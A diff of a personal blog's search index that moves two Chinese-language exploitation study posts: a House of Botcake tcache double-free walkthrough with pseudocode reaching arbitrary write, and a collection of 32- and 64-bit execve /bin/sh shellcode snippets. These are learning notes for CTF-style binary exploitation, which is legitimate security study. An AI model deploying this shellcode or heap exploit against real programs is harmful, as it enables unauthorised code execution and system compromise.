@@ -12,31 +12,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HeapAttack:House_of_Botcake</title>
-    <url>/2022/03/18/HeapAttack-House-of-Botcake/</url>
-    <content><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2>
-<ul>
-<li>glibc版本：≥ 2.3.1</li>
-<li>Tcache：开启</li>
-<li>漏洞要求：double free</li>
-</ul>
-<h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2>
-<h3 id="21-攻击效果"><a class="markdownIt-Anchor" href="#21-攻击效果"></a> 2.1 攻击效果</h3>
-<p>绕过Tcache的 tcache-dup 检查，将 ‘<em><strong>可控chunk</strong></em>’ 插入’<em><strong>Tcache-list</strong></em>’,修改‘<em><strong>可控chunk</strong></em>’的***fd***字段，从而__最终实现__‘<em><strong>任意地址写</strong></em>’。</p>
-<h3 id="22-攻击过程"><a class="markdownIt-Anchor" href="#22-攻击过程"></a> 2.2 攻击过程</h3>
-<p>伪代码表示如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">size = 0x108</span><br><span class="line"></span><br><span class="line">mem_lst = [ malloc(size) for x in range(7) ] #创建7个chunk</span><br><span class="line"></span><br><span class="line">a = malloc(size) </span><br><span class="line">b = malloc(size)  #a,b chunk是主角</span><br><span class="line"></span><br><span class="line">malloc(0x18) #和top_chunk隔离，防止forward-consolidation</span><br><span class="line"></span><br><span class="line">[free(x) for x in mem_lst] #把7个chunk free到tcache中,tcache被填满</span><br><span class="line"></span><br><span class="line">free(a) #因tcache已满，a、b进unsorted-bin</span><br><span class="line">free(b) #a、b邻接,因此发生consolidate合并成一个chunk在unsorted-bin中</span><br><span class="line"></span><br><span class="line">malloc(size) #一次分配后tcache有一个空位</span><br><span class="line">free(b) #对b使用double-free攻击。由于b不在tcache中，因此通过tcache检查被加入到tcache中。</span><br><span class="line"></span><br><span class="line">c = malloc(size + 0x30) #unsorted-bin发生remaindering，chunk-b的前0x30被memory-c overlap</span><br><span class="line"></span><br><span class="line">payload = size * b&quot;\0&quot; + p64(size) + p64(target_address) </span><br><span class="line">#不同size时的payload写法不同；但目的是target_address覆盖到 b-&gt;fd</span><br><span class="line"></span><br><span class="line">write(c, payload)  ##这里将target_address链接到tcache list中，下次对tcache size的内存请求即可分配到目标地址的内存chunk</span><br><span class="line"></span><br><span class="line">target_memory = malloc(size)</span><br><span class="line">write(target_memory, arbitrary_value)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考：</h3>
-<p><a href="https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/house_of_botcake.c">heap_exploit_2.31/house_of_botcake.c</a></p>
-]]></content>
-      <categories>
-        <category>HeapAttack, tcache</category>
-      </categories>
-      <tags>
-        <tag>HeapAttack, House_of_Botcake, tcache</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Format-String Attack</title>
     <url>/2022/03/18/fmtstr_attack/</url>
     <content><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2>
@@ -105,6 +80,33 @@ payload1实现写4(p32为4byte)到target_address</p>
       </tags>
   </entry>
   <entry>
+    <title>Shellcode Collection</title>
+    <url>/2022/03/21/shellcode/</url>
+    <content><![CDATA[<h2 id="32位"><a class="markdownIt-Anchor" href="#32位"></a> 32位</h2>
+<p>有&quot;\x00&quot;最短 20 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode= &#x27;&#x27;&#x27;            </span><br><span class="line">xor ecx,ecx               </span><br><span class="line">mul ecx                   </span><br><span class="line">mov al,0xb                </span><br><span class="line">push 0x68732f             </span><br><span class="line">push 0x6e69622f           </span><br><span class="line">mov ebx,esp               </span><br><span class="line">int 0x80                  </span><br><span class="line">&#x27;&#x27;&#x27;                       </span><br><span class="line">shellcode=asm(shellcode)</span><br></pre></td></tr></table></figure>
+<p>无&quot;\x00&quot;最短 21 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">mul ecx</span><br><span class="line">push eax</span><br><span class="line">mov al,0xb</span><br><span class="line">push 0x68732f2f   </span><br><span class="line">push 0x6e69622f   </span><br><span class="line">mov ebx,esp</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<p>标准shellcode 23 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">push edx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xB</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<h2 id="64位"><a class="markdownIt-Anchor" href="#64位"></a> 64位</h2>
+<p>最短有&quot;\x00&quot; 22 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">mov rbx,0x68732f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>最短无&quot;\x00&quot; 23 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">push rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>标准shellcode 31 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor    rdi,rdi</span><br><span class="line">xor    rsi,rsi</span><br><span class="line">xor    rdx,rdx</span><br><span class="line">xor    rax,rax</span><br><span class="line">push   rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push   rbx</span><br><span class="line">mov    rdi,rsp</span><br><span class="line">mov    al,0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<h3 id="转载自"><a class="markdownIt-Anchor" href="#转载自"></a> 转载自:</h3>
+<p><a href="https://b0ldfrev.gitbook.io/note/pwn/linux_shellcode">Linux_ShellCode</a></p>
+]]></content>
+      <categories>
+        <category>shellcode</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HeapAttack:LargeBinAttack</title>
     <url>/2022/03/23/HeapAttack-LargeBinAttack/</url>
     <content><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2>
@@ -151,30 +153,28 @@ large-bin:
       </tags>
   </entry>
   <entry>
-    <title>Shellcode Collection</title>
-    <url>/2022/03/21/shellcode/</url>
-    <content><![CDATA[<h2 id="32位"><a class="markdownIt-Anchor" href="#32位"></a> 32位</h2>
-<p>有&quot;\x00&quot;最短 20 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode= &#x27;&#x27;&#x27;            </span><br><span class="line">xor ecx,ecx               </span><br><span class="line">mul ecx                   </span><br><span class="line">mov al,0xb                </span><br><span class="line">push 0x68732f             </span><br><span class="line">push 0x6e69622f           </span><br><span class="line">mov ebx,esp               </span><br><span class="line">int 0x80                  </span><br><span class="line">&#x27;&#x27;&#x27;                       </span><br><span class="line">shellcode=asm(shellcode)</span><br></pre></td></tr></table></figure>
-<p>无&quot;\x00&quot;最短 21 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">mul ecx</span><br><span class="line">push eax</span><br><span class="line">mov al,0xb</span><br><span class="line">push 0x68732f2f   </span><br><span class="line">push 0x6e69622f   </span><br><span class="line">mov ebx,esp</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-<p>标准shellcode 23 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">push edx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xB</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-<h2 id="64位"><a class="markdownIt-Anchor" href="#64位"></a> 64位</h2>
-<p>最短有&quot;\x00&quot; 22 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">mov rbx,0x68732f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<p>最短无&quot;\x00&quot; 23 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">push rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<p>标准shellcode 31 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor    rdi,rdi</span><br><span class="line">xor    rsi,rsi</span><br><span class="line">xor    rdx,rdx</span><br><span class="line">xor    rax,rax</span><br><span class="line">push   rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push   rbx</span><br><span class="line">mov    rdi,rsp</span><br><span class="line">mov    al,0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<h3 id="转载自"><a class="markdownIt-Anchor" href="#转载自"></a> 转载自:</h3>
-<p><a href="https://b0ldfrev.gitbook.io/note/pwn/linux_shellcode">Linux_ShellCode</a></p>
+    <title>HeapAttack:House_of_Botcake</title>
+    <url>/2022/03/18/HeapAttack-House-of-Botcake/</url>
+    <content><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2>
+<ul>
+<li>glibc版本：≥ 2.3.1</li>
+<li>Tcache：开启</li>
+<li>漏洞要求：double free</li>
+</ul>
+<h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2>
+<h3 id="21-攻击效果"><a class="markdownIt-Anchor" href="#21-攻击效果"></a> 2.1 攻击效果</h3>
+<p>绕过Tcache的 tcache-dup 检查，将 ‘<em><strong>可控chunk</strong></em>’ 插入’<em><strong>Tcache-list</strong></em>’,修改‘<em><strong>可控chunk</strong></em>’的***fd***字段，从而__最终实现__‘<em><strong>任意地址写</strong></em>’。</p>
+<h3 id="22-攻击过程"><a class="markdownIt-Anchor" href="#22-攻击过程"></a> 2.2 攻击过程</h3>
+<p>伪代码表示如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">size = 0x108</span><br><span class="line"></span><br><span class="line">mem_lst = [ malloc(size) for x in range(7) ] #创建7个chunk</span><br><span class="line"></span><br><span class="line">a = malloc(size) </span><br><span class="line">b = malloc(size)  #a,b chunk是主角</span><br><span class="line"></span><br><span class="line">malloc(0x18) #和top_chunk隔离，防止forward-consolidation</span><br><span class="line"></span><br><span class="line">[free(x) for x in mem_lst] #把7个chunk free到tcache中,tcache被填满</span><br><span class="line"></span><br><span class="line">free(a) #因tcache已满，a、b进unsorted-bin</span><br><span class="line">free(b) #a、b邻接,因此发生consolidate合并成一个chunk在unsorted-bin中</span><br><span class="line"></span><br><span class="line">malloc(size) #一次分配后tcache有一个空位</span><br><span class="line">free(b) #对b使用double-free攻击。由于b不在tcache中，因此通过tcache检查被加入到tcache中。</span><br><span class="line"></span><br><span class="line">c = malloc(size + 0x30) #unsorted-bin发生remaindering，chunk-b的前0x30被memory-c overlap</span><br><span class="line"></span><br><span class="line">payload = size * b&quot;\0&quot; + p64(size) + p64(target_address) </span><br><span class="line">#不同size时的payload写法不同；但目的是target_address覆盖到 b-&gt;fd</span><br><span class="line"></span><br><span class="line">write(c, payload)  ##这里将target_address链接到tcache list中，下次对tcache size的内存请求即可分配到目标地址的内存chunk</span><br><span class="line"></span><br><span class="line">target_memory = malloc(size)</span><br><span class="line">write(target_memory, arbitrary_value)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考：</h3>
+<p><a href="https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/house_of_botcake.c">heap_exploit_2.31/house_of_botcake.c</a></p>
 ]]></content>
       <categories>
-        <category>shellcode</category>
+        <category>HeapAttack, tcache</category>
       </categories>
       <tags>
-        <tag>shellcode</tag>
+        <tag>HeapAttack, House_of_Botcake, tcache</tag>
       </tags>
   </entry>
 </search>
